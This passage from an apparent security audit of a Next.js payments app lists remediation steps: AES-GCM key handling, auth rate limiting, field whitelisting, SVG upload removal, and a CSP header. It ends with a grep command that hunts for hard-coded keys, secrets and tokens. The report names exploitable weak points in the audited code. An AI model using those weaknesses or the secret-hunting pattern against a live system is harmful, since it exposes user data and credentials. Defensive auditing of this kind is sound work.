At `src/app/api/admin/payouts/[id]/route.ts`, `src/app/api/dashboard/payout/settings/route.ts`, `src/app/api/cron/payout/route.ts`:
```ts
const rawKey = process.env.PAYOUT_ENCRYPTION_KEY
if (!rawKey) throw new Error('PAYOUT_ENCRYPTION_KEY is not set')
const KEY = Buffer.from(rawKey, 'base64')
if (KEY.length !== 32) throw new Error('PAYOUT_ENCRYPTION_KEY must decode to 32 bytes')
```
Migrate encryption to AES-256-GCM with per-record 12-byte IV and AAD = creator id. Re-encrypt existing rows as a one-off migration.

**3. Rate-limit auth.**
Using the already-installed `@upstash/redis`:
```ts
import { Ratelimit } from '@upstash/ratelimit'
const authLimit = new Ratelimit({ redis, limiter: Ratelimit.slidingWindow(5, '15 m') })
```
Apply keyed on IP for register/forgot; keyed on (IP, email) for login.

**4. Lock product type.**
In `PATCH /api/products/[id]`, explicitly pick allowed fields with a zod schema — do not include `type`.

**5. Harden `/api/track/view`.**
```ts
const ip = req.headers.get('cf-connecting-ip') ?? req.headers.get('x-forwarded-for')?.split(',')[0] ?? null
const session = await auth()
// ignore body.userId / body.ipAddress entirely
```
Add Upstash rate limit of 60 events / IP / hour.

**6. Drop SVG from public uploads.**
In `src/app/api/upload/route.ts`, remove `'image/svg+xml'` from `ALLOWED_IMAGE_TYPES`. Or gate it behind `category === 'profile_logo'` and pipe through a DOMPurify-SVG sanitize pass.

**7. Await webhook handlers.**
Replace `void handlePaymentSucceeded(intentId)` with `await handlePaymentSucceeded(intentId)`. If processing exceeds 10s for a single event, move to a queue.

**8. Add a CSP header.**
In `next.config.ts`:
```ts
{ key: 'Content-Security-Policy', value: "default-src 'self'; img-src 'self' data: blob: https:; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self' https:; frame-ancestors 'self'" }
```
Iterate with browser dev-tools until no legitimate assets are blocked, then tighten.

---

## 9. Closing observations

This is a codebase built by someone who has been burned before. The webhook HMAC, the atomic idempotency claim, the central `guards.ts`, the price re-computation server-side, the private-R2 proxy with short-TTL signed URLs, the `usedCount` atomic discount increment — these are not accidents. Someone thought about the attack surface.

The gaps that remain are the gaps people miss the *second* time through a codebase: the duplicate legacy route that never got deleted, the env-variable fallback that was meant to be removed before launch, the client-supplied field in an analytics endpoint that got added "temporarily" and stayed. Fix the ten items in section 6 and this ships responsibly.

The single most important recommendation in this report is: **run `grep -R "??" src/ | grep -i -E "(key|secret|password|token)"` before launch**. Every env-fallback-to-constant is a time-bomb that detonates the first time someone deploys without reading the checklist. The one in `PAYOUT_ENCRYPTION_KEY` is the loudest, but I'd be surprised if it's the only one.

Good luck with the launch.
